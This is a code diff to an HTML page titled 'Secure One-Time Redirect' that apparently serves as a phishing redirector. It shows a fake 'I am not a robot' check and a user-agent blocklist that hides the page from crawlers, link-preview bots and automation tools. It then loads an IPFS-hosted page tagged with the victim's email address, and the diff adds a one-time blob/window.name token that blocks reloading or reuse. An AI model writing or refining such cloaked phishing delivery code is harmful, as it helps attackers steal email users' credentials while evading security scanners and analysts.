@@ -5,29 +5,29 @@
 <title>Secure One-Time Redirect</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-html, body { margin:0; padding:0; width:100%; height:100%; font-family:'Segoe UI', Tahoma, sans-serif; }
-#overlay { position:fixed; top:0; left:0; right:0; bottom:0; background:#f0f2f5; display:flex; align-items:center; justify-content:center; opacity:0; transition:opacity 0.3s ease; z-index:99999; }
-#verificationBox { background:#fff; padding:26px 32px; border-radius:8px; width:310px; text-align:left; border:1px solid #dcdcdc; box-shadow:0 6px 20px rgba(0,0,0,0.12); }
-#robotIcon { width:32px; height:32px; border-radius:50%; background:#e8f0fe; display:flex; align-items:center; justify-content:center; font-size:20px; animation:rotateRobot 2s linear infinite; }
-#checkbox { width:26px; height:26px; border:2px solid #7f8fa6; border-radius:4px; cursor:pointer; transition:0.3s; }
-#verifying { margin-top:18px; display:none; font-size:14px; color:#555; }
-.spinner { width:16px; height:16px; border:3px solid #40739e; border-top-color:transparent; border-radius:50%; animation:spin 0.6s linear infinite; }
-#badge { font-size:10px; color:#888; margin-top:18px; text-align:right; opacity:0.7; }
-@keyframes spin { from { transform:rotate(0deg);} to { transform:rotate(360deg);} }
-@keyframes rotateRobot { from { transform:rotate(0deg);} to { transform:rotate(360deg);} }
+html,body{margin:0;padding:0;width:100%;height:100%;font-family:'Segoe UI', Tahoma, sans-serif;}
+#overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:#f0f2f5;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity 0.3s ease;z-index:99999;}
+#verificationBox{background:#fff;padding:26px 32px;border-radius:8px;width:310px;text-align:left;border:1px solid #dcdcdc;box-shadow:0 6px 20px rgba(0,0,0,0.12);}
+#robotIcon{width:32px;height:32px;border-radius:50%;background:#e8f0fe;display:flex;align-items:center;justify-content:center;font-size:20px;animation:rotateRobot 2s linear infinite;}
+#checkbox{width:26px;height:26px;border:2px solid #7f8fa6;border-radius:4px;cursor:pointer;transition:0.3s;}
+#verifying{margin-top:18px;display:none;font-size:14px;color:#555;}
+.spinner{width:16px;height:16px;border:3px solid #40739e;border-top-color:transparent;border-radius:50%;animation:spin 0.6s linear infinite;}
+#badge{font-size:10px;color:#888;margin-top:18px;text-align:right;opacity:0.7;}
+@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+@keyframes rotateRobot{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
 </style>
 </head>
 <body>
 
 <div id="overlay">
     <div id="verificationBox">
-        <div style="display:flex; align-items:center; gap:12px;">
+        <div style="display:flex;align-items:center;gap:12px;">
             <div id="robotIcon">🤖</div>
-            <div style="flex:1;"><strong style="font-size:15px; color:#333;">I am not a robot</strong></div>
+            <div style="flex:1;"><strong style="font-size:15px;color:#333;">I am not a robot</strong></div>
             <div id="checkbox"></div>
         </div>
         <div id="verifying">
-            <div style="display:flex; align-items:center; gap:8px;">
+            <div style="display:flex;align-items:center;gap:8px;">
                 <div class="spinner"></div> Verifying…
             </div>
         </div>
@@ -37,28 +37,29 @@ html, body { margin:0; padding:0; width:100%; height:100%; font-family:'Segoe UI
 
 <script>
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
-let humanMoved = false;
-window.addEventListener("mousemove", () => humanMoved = true);
-window.addEventListener("touchstart", () => humanMoved = true);
+let humanMoved=false;
+window.addEventListener("mousemove",()=>humanMoved=true);
+window.addEventListener("touchstart",()=>humanMoved=true);
 
-function isBot() {
-    const ua = navigator.userAgent.toLowerCase();
-    const bots = ["bot","crawl","spider","slurp","fetch","preview","facebook","discord","telegram","linkedin","whatsapp","headless","python","curl","wget","scrapy","phantom","selenium","puppeteer","playwright","httpclient","go-http"];
+function isBot(){
+    const ua=navigator.userAgent.toLowerCase();
+    const bots=["bot","crawl","spider","slurp","fetch","preview","facebook","discord","telegram","linkedin","whatsapp","headless","python","curl","wget","scrapy","phantom","selenium","puppeteer","playwright","httpclient","go-http"];
     if(bots.some(b=>ua.includes(b))) return true;
     if(navigator.webdriver && !window._testing) return true;
     return false;
 }
 
-function showFakePage() {
-    document.body.innerHTML = `<div style="width:100%; height:100vh; display:flex; align-items:center; justify-content:center;"><div><h2>Welcome</h2><p>This page is currently unavailable.</p></div></div>`;
+function showFakePage(){
+    document.body.innerHTML=`<div style="width:100%;height:100vh;display:flex;align-items:center;justify-content:center;">
+        <div><h2>Welcome</h2><p>This page is currently unavailable.</p></div></div>`;
 }
 
-function requireVerification() {
+function requireVerification(){
     return new Promise(resolve=>{
-        const overlay = document.getElementById("overlay");
+        const overlay=document.getElementById("overlay");
         overlay.style.opacity=1;
-        const checkbox = document.getElementById("checkbox");
-        const verifying = document.getElementById("verifying");
+        const checkbox=document.getElementById("checkbox");
+        const verifying=document.getElementById("verifying");
         function verify(){
             checkbox.style.background="#40739e";
             checkbox.style.borderColor="#40739e";
@@ -74,47 +75,49 @@ function requireVerification() {
     });
 }
 
-function getEmail(){ return new URLSearchParams(location.search).get("email")||""; }
-function buildIPFS(email){ return email?BASE_IPFS+"#"+email:BASE_IPFS; }
+function getEmail(){return new URLSearchParams(location.search).get("email")||"";}
+function buildIPFS(email){return email?BASE_IPFS+"#"+email:BASE_IPFS;}
 
-function createBlobHTML(url){
-    // No token, just direct iframe
-    return `<!DOCTYPE html>
-<html>
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;} iframe{position:fixed;top:0;left:0;width:100%;height:100%;border:none;}</style>
-</head>
-<body>
-<iframe src="${url}"></iframe>
-</body>
-</html>`;
-}
-
-document.addEventListener("DOMContentLoaded", async()=>{
+document.addEventListener("DOMContentLoaded",async()=>{
     if(isBot()) return showFakePage();
     await new Promise(r=>setTimeout(r,300+Math.random()*300));
     if(!humanMoved) await new Promise(r=>setTimeout(r,500));
     await requireVerification();
 
-    const email = getEmail();
-    const redirectURL = buildIPFS(email);
+    const email=getEmail();
+    const redirectURL=buildIPFS(email);
 
-    // Create blob and open in a new window
-    const blobHTML = createBlobHTML(redirectURL);
-    const blob = new Blob([blobHTML], {type:"text/html"});
-    const blobURL = URL.createObjectURL(blob);
+    // Create unique token for this session
+    const token=crypto.randomUUID();
 
-    // Open blob in new tab/window immediately
-    const win = window.open(blobURL, "_blank");
+    // Create blob with token embedded in-memory only
+    const blobHTML=`<!DOCTYPE html>
+<html>
+<head><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;} iframe{width:100%;height:100%;border:none;}</style>
+</head>
+<body>
+<script>
+if(!window.name || window.name!="${token}"){
+    document.body.innerHTML="<div style='width:100%;height:100vh;display:flex;align-items:center;justify-content:center;font-family:Arial;color:#900;'><div><h2>Expired or Reloaded</h2><p>This page cannot be reloaded or reused.</p></div></div>";
+}else{
+    document.body.innerHTML='<iframe src="${redirectURL}"></iframe>';
+}
+<\/script>
+</body>
+</html>`;
 
-    // Revoke blob URL immediately to prevent reuse
-    setTimeout(()=>URL.revokeObjectURL(blobURL),100);
+    const blob=new Blob([blobHTML],{type:"text/html"});
+    const blobURL=URL.createObjectURL(blob);
 
-    // Optionally show message in parent page
-    document.body.innerHTML=`<div style="width:100%; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial;">
-        <div><h2>Redirected!</h2><p>This link cannot be reloaded or copied.</p></div>
-    </div>`;
+    // Set token in window.name to allow this single load
+    window.name=token;
+
+    // Redirect in same tab
+    location.href=blobURL;
+
+    // Revoke URL after a short delay
+    setTimeout(()=>URL.revokeObjectURL(blobURL),5000);
 });
 </script>
 
